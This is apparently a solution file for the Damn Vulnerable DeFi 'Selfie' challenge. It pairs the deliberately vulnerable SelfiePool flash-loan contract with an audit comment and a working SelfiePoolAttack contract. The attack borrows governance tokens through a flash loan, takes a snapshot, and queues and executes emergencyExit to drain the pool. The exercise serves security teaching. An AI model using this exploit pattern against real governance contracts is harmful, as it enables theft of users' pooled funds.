// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {

    ERC20Snapshot public immutable token;
    SimpleGovernance public immutable governance;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    error RepayFailed();
    error CallerNotGovernance();
    error UnsupportedCurrency();
    error CallbackFailed();

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        if (msg.sender != address(governance))
            revert CallerNotGovernance();
        _;
    }

    constructor(address _token, address _governance) {
        token = ERC20Snapshot(_token);
        governance = SimpleGovernance(_governance);
    }

    function maxFlashLoan(address _token) external view returns (uint256) {
        if (address(token) == _token)
            return token.balanceOf(address(this));
        return 0;
    }

    function flashFee(address _token, uint256) external view returns (uint256) {
        if (address(token) != _token)
            revert UnsupportedCurrency();
        return 0;
    }

    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external nonReentrant returns (bool) {
        if (_token != address(token))
            revert UnsupportedCurrency();

        token.transfer(address(_receiver), _amount);
        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS)
            revert CallbackFailed();

        if (!token.transferFrom(address(_receiver), address(this), _amount))
            revert RepayFailed();
        
        return true;
    }

    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
}

// @audit 
// a) Need to call SelfiePool.emergencyExit() to drain pool, but this can
// only be called from governance address.
//
// b) SimpleGovernance._hasEnoughVotes() passes if at the last snapshot we
// had more than half the token supply.
//
// c) Token created with 2M supply, 1.5M given to pool & available for flash loan.
//
// Attack:
//
// 1) Take flash loan for 1.5M & call DamnValuableTokenSnapshot.snapshot()
//
// 2) Call SimpleGovernance.queueAction() to propose SelfiePool.emergencyExit()
//
// 3) Wait 2 days to bypass check in SimpleGovernance._canBeExecuted()
//
// 4) Call SimpleGovernance.executeAction() to execute proposed action
//
contract SelfiePoolAttack is IERC3156FlashBorrower {
    SelfiePool selfiePool;
    uint256 actionId;

    function attack(address payable _selfiePool, uint256 _loanAmount) external {
        selfiePool = SelfiePool(_selfiePool);

        // before getting flashLoan, approve SelfiePool as spender for token loanAmount
        // as it attempts to transfer tokens back to itself at end of SelfiePool.flashLoan()
        selfiePool.token().approve(_selfiePool, _loanAmount);
        selfiePool.flashLoan(this, address(selfiePool.token()), _loanAmount, "");

        actionId = selfiePool.governance().queueAction(
                        _selfiePool, 
                        0, 
                        abi.encodeWithSignature("emergencyExit(address)", msg.sender));
    }

    function completeAttack() external {
        selfiePool.governance().executeAction(actionId);
    }

    // @dev implement IERC3156FlashBorrower.onFlashLoan()
    // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/interfaces/IERC3156FlashBorrower.sol
    function onFlashLoan(address,address,uint256,uint256,bytes calldata) external returns (bytes32) {
        DamnValuableTokenSnapshot(address(selfiePool.token())).snapshot();
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}